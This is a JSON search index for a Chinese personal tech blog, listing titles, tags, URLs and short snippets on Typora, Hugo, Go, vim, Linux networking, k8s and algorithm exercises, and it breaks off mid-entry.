[{"content":"typora软件使用 typora 目前已经收费了，不过可以下载免费版本， 这里用做个总结，因为 已经习惯了这个软件，切换到别的软件还用的不顺手 typora 免费版安装 d","lvl0":"typora软件使用","lvl1":["markdown"],"lvl2":"摘要","objectID":"c17428edb3806502f5d593fe7ef13fd1","tags":["markdown"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/markdown/typora%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/"},{"content":"hugo的使用总结 ​ shortcode 使用总结 1 . 定义 shortcode 解析 yaml语法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 {{ with .Inner | transform.Unmarshal }} \u0026lt;a class=\u0026#34;friends\u0026#34; target=\u0026#34;_blank\u0026#34; title=\u0026#34;{{ .name }}\u0026#34; href=\u0026#34;{{ .link }}\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34; \u0026gt; {{ if .avatar }} \u0026lt;img class=\u0026#34;lazyload","lvl0":"hugo的使用总结,shortcode使用","lvl1":["markdown"],"lvl2":"摘要","objectID":"753324ed9d49fedb682cf211556393fb","tags":["markdown"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/markdown/hugo%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"},{"content":"lucene ​ 使用普通数据库的缺陷 因为没有通过高效的索引方式，所以查询的速度在大量数据的情况下是很慢。 搜索效果比较差，只能对用户输入的完整关键字首尾位","lvl0":"lucene","lvl1":["搜索引擎"],"lvl2":"摘要","objectID":"391e909565174f5c633991ad26a92b8a","tags":["搜索引擎"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/lucene/"},{"content":"obsidian软件使用 这个软件 我也是第一次用： typora 软件 已经用了好久了， typora 配合我自己定义的 js 脚本用起来太爽了，目前还不习惯 ob软件， 只能 typora 为主","lvl0":"obsidian软件使用","lvl1":["markdown"],"lvl2":"摘要","objectID":"0349279fcaae5efd4c32c2cd27cace10","tags":["markdown"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/markdown/obsidian%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/"},{"content":"c语言gui知识 c语言gui界面编程学习 1. Windows程序简介： 实际上Vindows系统大家应该再熟悉不过了，Vindows程序呢也主要分","lvl0":"c语言gui知识","lvl1":["cpp基础语法"],"lvl2":"摘要","objectID":"eee9cfade84061c53289d58c6566d2c3","tags":["cpp基础语法"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/cpp/cpp%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/c%E8%AF%AD%E8%A8%80gui%E7%9F%A5%E8%AF%86/"},{"content":"质数算法总结 学习视频 参考李永乐老师的数学教程 艾尔尼筛法 朴素解法 2是质数，2的倍数全部都不是质数，把不是质数的数在地图中全部涂掉 这个做法 的复杂","lvl0":"质数算法总结","lvl1":["分解因数专题"],"lvl2":"摘要","objectID":"629b9b77080d512327b7e408c3b51b19","tags":["分解因数专题"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E5%AD%A6/%E5%88%86%E8%A7%A3%E5%9B%A0%E6%95%B0%E4%B8%93%E9%A2%98/%E8%B4%A8%E6%95%B0%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"},{"content":"中断机制 学习教程 目的 目的： 1.硬件的中断响应\u0026mdash;-\u0026gt;内核驱动中的中断 2.系统调用的函数响应(sys ca11)\u0026ndash;\u0026","lvl0":"中断机制","lvl1":["linux内核理解"],"lvl2":"摘要","objectID":"662e1cf5305f7339a733595195905463","tags":["linux内核理解"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/linux%E5%86%85%E6%A0%B8%E7%90%86%E8%A7%A3/%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/"},{"content":"easyx框架学习 ​ easyx 自带的颜色常量 常量 值 颜色 BLACK 0 黑 BULE 0xAA0000 0XAA0000 CYAN OXAAAA00 青 MAGENTA OXAAOOAA 紫 参考文章 函数 解释 使用 initgraph initgraph(int width,int height,int flag=NULL):初始化绘图环境 cleardevice(): 用于","lvl0":"easyx框架学习","lvl1":["cpp"],"lvl2":"摘要","objectID":"71e24732a586d5fc7173a74052e2a7f3","tags":["cpp"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/cpp/easyx%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/easyx%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"},{"content":"whoosh搜索引擎使用 ​ 1 pip install whoosh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from ast import And from fileinput import filename from msilib.schema import tables import os.path from tokenize","lvl0":"whoosh搜索引擎使用","lvl1":["Python"],"lvl2":"摘要","objectID":"b234773f17f769459fa410b886c9357e","tags":["Python"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/python/whoosh%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8/"},{"content":"http简介 几种请求方式 表格的内容可以在 图解http这本书里面查看到 方法 解释 作用 post 传输实体主题 经常用，这里不解释 put 传输文件 put方法主要用于","lvl0":"http简介","lvl1":["计算机网络"],"lvl2":"摘要","objectID":"0196fbfc3ee4f9becf0ce56ed58619e0","tags":["计算机网络"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/http%E7%AE%80%E4%BB%8B/"},{"content":"编写一个文本框 ​ 参考教程 不错的视频教程，布局 官方文档： https://fyne.io/ 实现一个电影介绍的app 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30","lvl0":"编写一个文本框","lvl1":["fyne编程"],"lvl2":"摘要","objectID":"48404a6dc793233f15422541d8d659a1","tags":["fyne编程"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/todo/fyne%E7%BC%96%E7%A8%8B/%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E6%96%87%E6%9C%AC%E6%A1%86/"},{"content":"linux邮箱命令行 ​ 学习教程 安装环境 1 2 3 4 5 6 7 # apt-get install sendmail # systemctl start sendmail # # 安装的时候 选择 network site service postfix start # 开机自动启动 chkconfig postfix on 配置 /etc/mail.rc 1 2 3 4 5 6 7 set from=lyr-2000@qq.com","lvl0":"linux邮箱命令行","lvl1":["shell命令学习"],"lvl2":"摘要","objectID":"7b626e93e82e9e0770cc29ba6224eeab","tags":["shell命令学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/linux%E9%82%AE%E7%AE%B1%E5%91%BD%E4%BB%A4%E8%A1%8C/"},{"content":"网络操作 ​ 命令 解释 ss netstat tcpdump httpie工具 这个是命令行工具，要另外下载，可以代替 wget 和 curl httpie工具下载 参考github地址 官方文档 视频使用","lvl0":"网络操作","lvl1":["shell命令学习"],"lvl2":"摘要","objectID":"512cfc5555478104cf9fd866f28effa5","tags":["shell命令学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C/"},{"content":"正则表达式和扩展正则表达式 ​ 正则表达式的意义 处理大量字符串 处理文本 linux运维工作中，面临大量字符串内容，如 配置文件 程序代码 命令输出结果 日","lvl0":"正则表达式和扩展正则表达式","lvl1":["shell命令学习"],"lvl2":"摘要","objectID":"c9916e7ba6431dbc16cc4c4b4bcc98d3","tags":["shell命令学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%92%8C%E6%89%A9%E5%B1%95%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"content":"commandline 快捷键 ​ bash 命令行快捷键 ctrl a 移动到命令头 ctrl u 删除光标前支付 ctrl k 删除光标之后的字符 ctrl l 相当于clear 命令行补全 tab键","lvl0":"commandline 快捷键","lvl1":["shell命令学习"],"lvl2":"摘要","objectID":"7768fc3de10044704e67596f3bd2f1e7","tags":["shell命令学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/commandline-%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"content":"gdb工具使用 参考文档 对于C程序来说，需要在编译时加上-g参数，保留调试信息，否则不能使用GDB进行调试 1 gcc -g test.c -o a.out 1 gdb a.out gdb使用条件 使用","lvl0":"gdb工具使用","lvl1":["shell命令学习"],"lvl2":"摘要","objectID":"a0ae6695517b9cf6e180343402cfc55a","tags":["shell命令学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/gdb%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"content":"lc94.中序遍历 ​ 给定一个二叉树的根节点 root ，返回 它的 中序 遍历 。 示例 1： 输入：root = [1,null,2,3] 输出：[1,3,2] 示例 2： 输入：root = [] 输出","lvl0":"lc94.中序遍历","lvl1":["二叉搜索树"],"lvl2":"摘要","objectID":"051ce06d372cba2406281102b2ddc3cf","tags":["二叉搜索树"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/lc94.%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86/"},{"content":"lc.145.二叉树的后序遍历 ​ 给你一棵二叉树的根节点 root ，返回其节点值的 后序遍历 。 示例 1： 输入：root = [1,null,2,3] 输出：[3,2,1] 示例 2： 输入","lvl0":"lc.145.二叉树的后序遍历","lvl1":["二叉搜索树"],"lvl2":"摘要","objectID":"4a842cf4e12f08207a0bcb40b33af4ca","tags":["二叉搜索树"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/lc.145.%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86/"},{"content":"etcd了解 术语 描述 备注 raft raft算法，etcd一致性核心 etcd-raft模块 Follower raft中的从属节点 竞争leader失败 candidate 候选节点 foll","lvl0":"etcd了解","lvl1":["etcd"],"lvl2":"摘要","objectID":"c956e1dcf0fc5c50524ccdf5a30f88be","tags":["etcd"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/etcd/etcd%E4%BA%86%E8%A7%A3/"},{"content":"文件系统 定义 文件系统是指操作系统用于明确存储设备或分区上的文件的方法和数据结构，即在存储设备上组织文件的方法；操作系统中负责管理和存储文件信","lvl0":"文件系统,inode","lvl1":["linux内核理解"],"lvl2":"摘要","objectID":"a56a6493b7c1c12ed216068203dfe2d2","tags":["linux内核理解"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/linux%E5%86%85%E6%A0%B8%E7%90%86%E8%A7%A3/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"content":"unicode编码原理 ​ unicode编码原理 参考博客 Unicode 编码共有三种具体实现，分别为utf-8,utf-16,utf-32，其中utf-8占","lvl0":"unicode编码原理","lvl1":["基础"],"lvl2":"摘要","objectID":"8b3be22726d973c6778eda7fb87f06ec","tags":["基础"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80/unicode%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86/"},{"content":"了解dll ​ 学习教程 DLL：Dynamic Link Library，即动态链接库，这种库包含了可由多个程序同时使用的代码和数据。 它是microsof","lvl0":"了解dll","lvl1":["基础"],"lvl2":"摘要","objectID":"e06033b40e9c15a6bc15a0d41f6b6fe5","tags":["基础"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80/%E4%BA%86%E8%A7%A3dll/"},{"content":"ctags工具使用 ​ 学习教程 参考博客 安装 ctags 1 2 3 4 sudo apt-get install ctags; ctags -R * # 直接生成 tags索引文件 vim 中要使用 ctags 1 2 3 4 :Tagbar # 打开tagbar 预览 # 按 ctrl","lvl0":"ctags工具使用","lvl1":["vim"],"lvl2":"摘要","objectID":"e8f8f22bbc743b7af1bb888780b0d24f","tags":["vim"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/vim/ctags%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"content":"space vim配置 ​ wsl ubuntu_space vim配置 1 2 3 4 5 6 7 8 \u0026#34; 共用系统剪切板 set clipboard=unnamedplus execute \u0026#39;source\u0026#39; fnamemodify(expand(\u0026#39;\u0026lt;sfile\u0026gt;\u0026#39;), \u0026#39;:h\u0026#39;).\u0026#39;/config/main.vim\u0026#39; \u0026#34; How to \u0026#34;copy to clipboard\u0026#34; in vim of Bash on Windows? autocmd TextYankPost * if v:event.operator ==# \u0026#39;y\u0026#39; | call system(\u0026#39;/mnt/c/Windows/System32/clip.exe\u0026#39;, @0) | endif","lvl0":"space vim配置","lvl1":["vim学习"],"lvl2":"摘要","objectID":"2a73f6be960c594865819b8dabda50c3","tags":["vim学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/space-vim%E9%85%8D%E7%BD%AE/"},{"content":"cpp基础语法 指针 ​ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;bits/stdc++.h\u0026gt;using namespace std; int * func() { int *p = new int(10); return p; } int main(void) { int *p = func(); cout \u0026lt;\u0026lt; \u0026#34;aa\u0026#34; \u0026lt;\u0026lt;endl; cout \u0026lt;\u0026lt; *p \u0026lt;\u0026lt;endl ; delete(p); p","lvl0":"指针","lvl1":["cpp基础语法"],"lvl2":"摘要","objectID":"7f22714f9f19918116aeecffdcf0ffba","tags":["cpp基础语法"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/cpp/cpp%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/%E6%8C%87%E9%92%88/"},{"content":"mklink创建链接 ​ windows 通过 mklink 实现 文件夹搬家 1 2 C:\\WINDOWS\\system32\u0026gt;mklink /J \u0026#34;C:\\Users\\ASUS\\.SpaceVim\u0026#34; \u0026#34;D:\\Users\\ASUS\\.SpaceVim\u0026#34; 为 C:\\Users\\ASUS\\.SpaceVim \u0026lt;\u0026lt;===\u0026gt;\u0026gt; D:\\Users\\ASUS\\.SpaceVim 创建的联接 1 2 mklink /J \u0026#34;C:\\Users\\ASUS\\node_modules\u0026#34; \u0026#34;D:\\Users\\ASUS\\node_modules\u0026#34; # 把一些不三不四的什么文件都移动到 d盘，防止占用 参考学","lvl0":"mklink创建链接","lvl1":["windows10学习"],"lvl2":"摘要","objectID":"42837b0ea1053905fd4963d40154e9da","tags":["windows10学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/mklink%E5%88%9B%E5%BB%BA%E9%93%BE%E6%8E%A5/"},{"content":"命令使用 ​ kubectl命令 核心点： 通过 yaml 配置文件 定义了 我在 平台上运行什么命令 然后 k8s 通过 配置 文件的命令配置 保存起来，调用自己的接口 来 开启容器","lvl0":"命令使用","lvl1":["K8s"],"lvl2":"摘要","objectID":"a6463ce940071904231118d83240bbe5","tags":["K8s"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/k8s/%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"},{"content":"golang环境搭建 首先安装linux环境下 go语言的开发环境 1 2 wget https://golang.google.cn/dl/go1.17.2.linux-amd64.tar.gz -O /tmp/go1.17.2.linux-amd64.tar.gz 1 2 3 4 mkdir -p $HOME/go tar -xvzf /tmp/go1.17.2.linux-amd64.tar.gz -C $HOME/go mv $HOME/go/go $HOME/go/go1.17.2 1 2 3 4 5 6 7 8 9 10 11 12 13 tee -a $HOME/.bashrc \u0026lt;\u0026lt;\u0026#39;EOF\u0026#39; #","lvl0":"golang环境搭建","lvl1":["基础语法"],"lvl2":"摘要","objectID":"832a589682140e334688aab047f89daa","tags":["基础语法"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/golang%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"content":"go单元测试 ​ 单元测试用例函数以 Test 开头，例如 TestXxx 或 Test_xxx （ Xxx 部分为任意字母数字组合，首字母大写）。函数参数必须是 *testing.T，可以使用该类","lvl0":"go单元测试","lvl1":["基础语法"],"lvl2":"摘要","objectID":"06b6c6607c1104ffce9e822c25750668","tags":["基础语法"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/go%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"比特币原理 ​ 参考学习视频 区块链，就是一个又一个区块组成的链条。每一个区块中保存了一定的信息，它们按照各自产生的时间顺序连接成链条。这个链条被","lvl0":"比特币原理","lvl1":["区块链"],"lvl2":"摘要","objectID":"1469bef08c5a3b4bfc13647c3033c50f","tags":["区块链"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/%E5%8C%BA%E5%9D%97%E9%93%BE/%E6%AF%94%E7%89%B9%E5%B8%81%E5%8E%9F%E7%90%86/"},{"content":"认识docker ​ 最近的三年多时间，关注容器圈的话应该会知道这么几个事情： 容器技术持续火爆 Kubernetes(k8s)成为容器编排管理的标","lvl0":"认识docker","lvl1":["Docker学习"],"lvl2":"摘要","objectID":"30618f5918dee474ba56d37831a648a1","tags":["Docker学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/docker%E5%AD%A6%E4%B9%A0/%E8%AE%A4%E8%AF%86docker/"},{"content":"pprof监控 ​ 参考学习视频 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package main import ( \u0026#34;flag\u0026#34; \u0026#34;github.com/spf13/viper\u0026#34; \u0026#34;log\u0026#34; \u0026#34;myproxyHttp/config\u0026#34; \u0026#34;myproxyHttp/httpproxy\u0026#34; \u0026#34;myproxyHttp/tcpproxy\u0026#34; \u0026#34;net/http\u0026#34; _ \u0026#34;net/http/pprof\u0026#34; \u0026#34;time\u0026#34; ) func main() { cconf := *flag.String(\u0026#34;conf\u0026#34;, \u0026#34;conf\u0026#34;, \u0026#34;configFile path\u0026#34;) //fmt.Println(\u0026#34;hello","lvl0":"pprof监控","lvl1":["基础语法"],"lvl2":"摘要","objectID":"4b065d61cf20c49b23a96f58843fe3a9","tags":["基础语法"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/pprof%E7%9B%91%E6%8E%A7/"},{"content":"ansible简单管理命令 ​ 1 2 3 4 5 6 7 8 9 ansible all --list-hosts ansible all -m ping # 查看webserver 有几台 ansible websrvs --list-hosts # 查看 appserver 有几台 ansible appsrvs --list-hosts # ping 10.0 的所有主机 ansible 10.0.0.* -m ping","lvl0":"ansible简单管理命令","lvl1":["ansible"],"lvl2":"摘要","objectID":"27163c725e3c6d0ffac9052509bc8849","tags":["ansible"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/ansible/ansible%E7%AE%80%E5%8D%95%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/"},{"content":"ansible介绍 ​ ansible是新出现的自动化运维工具，基于Python开发，集合了众多运维工具（puppet、chef、func、fa","lvl0":"ansible介绍","lvl1":["ansible"],"lvl2":"摘要","objectID":"a8a539616c779eec65ac1a51a3154f03","tags":["ansible"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/ansible/ansible%E4%BB%8B%E7%BB%8D/"},{"content":"wsl和host主机网络问题 ​ 参考博客 1 New-NetFirewallRule -DisplayName \u0026#34;WSL\u0026#34; -Direction Inbound -InterfaceAlias \u0026#34;vEthernet (WSL)\u0026#34; -Action Allow windows powershell 管理员执行，运行wsl内部的网络包","lvl0":"wsl和host主机网络问题","lvl1":["wsl"],"lvl2":"摘要","objectID":"124dd0cf35a81c6f3a81aba865b8c493","tags":["wsl"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/wsl/wsl%E5%92%8Chost%E4%B8%BB%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/"},{"content":"搭建和使用一个工单系统 ​ https://www.bilibili.com/video/BV13q4y157RE?spm_id_from=333.337.search-card.all.click devops工单系统分享","lvl0":"搭建和使用一个工单系统","lvl1":["项目实战"],"lvl2":"摘要","objectID":"a3d713457f85ad359760fcf158a0494b","tags":["项目实战"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/%E5%B7%A5%E5%8D%95%E7%B3%BB%E7%BB%9F/%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%AA%E5%B7%A5%E5%8D%95%E7%B3%BB%E7%BB%9F/"},{"content":"linux测试udp-tcp命令 ​ tcp端口检测 1 2 3 4 telnet localhost 8080 # 输入参数 nc -l -v 8080 # 监听端口 udp测试 1 2 3 nc -vu localhost 8080 # 实际使用时可以只用-u参","lvl0":"linux测试udp-tcp命令","lvl1":["tcp代理实践"],"lvl2":"摘要","objectID":"ba02de6240b7145818f144292248cc98","tags":["tcp代理实践"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/tcp%E4%BB%A3%E7%90%86%E5%AE%9E%E8%B7%B5/linux%E6%B5%8B%E8%AF%95udp-tcp%E5%91%BD%E4%BB%A4/"},{"content":"syscall使用详解 ​ https://golang.hotexamples.com/zh/examples/syscall/-/Listen/golang-listen-function-examples.html 1 2 3 4 5 // Set backlog size to the maximum if err = syscall.Listen(fd, syscall.SOMAXCONN); err != nil { syscall.Close(fd) return nil, err } 参考c底层源码 1 2 3 4 5 6 7 8 SYSCALL_DEFINE2(listen, int, fd, int, backlog) { // sysctl_somaxconn 是系统变量 net.core.somaxconn 的值","lvl0":"syscall使用详解","lvl1":["tcp代理实践"],"lvl2":"摘要","objectID":"7994f1802c64a75aa2e36d5c106e9da6","tags":["tcp代理实践"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/tcp%E4%BB%A3%E7%90%86%E5%AE%9E%E8%B7%B5/syscall%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"},{"content":"linux下使用 epoll优化 ​ 可以参考的tcp框架 linux 下使用 epoll优化，你必须知道的概念 level trigger, 和 edge trigger 名字 原理 水平出发（LT) 当进行sock","lvl0":"linux下使用 